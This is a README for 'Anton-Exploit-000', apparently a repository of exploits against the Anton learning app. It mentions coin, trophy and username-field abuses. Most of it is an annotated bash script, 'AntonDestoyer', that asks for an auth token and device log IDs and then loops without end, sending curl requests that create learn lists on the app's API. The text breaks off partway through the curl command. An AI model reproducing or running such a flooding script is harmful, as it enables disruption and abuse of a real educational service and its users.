# Anton-Exploit-000

This is an Anton Exploit i found.

I found it using networks tab on the chrome browser.
You shouldnt use this for illegal purposes.
Creator of Anton App if you want me to remove it, message me on discord .trueanarchy
There are many other exploits like setting your name to infinite characters and adding new sentences to your name like you would press enter in a text editor and it jumps to the next line. (this works with inspect element and copy - pasting the element of the username)
The infinite coin exploit has been fixed. Coins over 10000 have been put down to a normal amount.
As for the green star and trophy exploit, they still kinda works, even though kinda janky.

Documentation of the code in AntonDestoyer (the disabler)
This wont work as its just the documentation

This declares that the code is a bash executable
#!/bin/bash

This is the ENDPOINT aka the website the requests will be executed at
REGISTER_ENDPOINT="https://d-apis-db.anton.app/?p=learnList/create/create"

This will ask the user for the main text (english text)
read -p "Enter main text: " MAIN_TEXT

This will ask the user for the title it is gonna look like TITLE+RANDOM_NUMBER its in line 43
read -p "Enter title: " TITLE

This will ask for the devices NORMAL log id
read -p "Enter normal logId: " NORMAL_LOG_ID

This will ask for the devices DEVICE log id
read -p "Enter device log id: " DEVICE_LOG_ID

This will ask the user for the authtoken 
read -p "Enter auth token: " AUTH_TOKEN

This makes a loop that will repeat until ctrl + c is pressed or the terminal is closed
while true; do

    This will generate an number
    RANDOM_NUMBER=$(shuf -i 10000-99999 -n 1)

    This will combine the title
    RANDOM_NAME="${TITLE} - ${RANDOM_NUMBER}"

    This will send the curl request with the user-provided values ( dont change anything here you can change it to use random useragents tho )
    curl "${REGISTER_ENDPOINT}" \
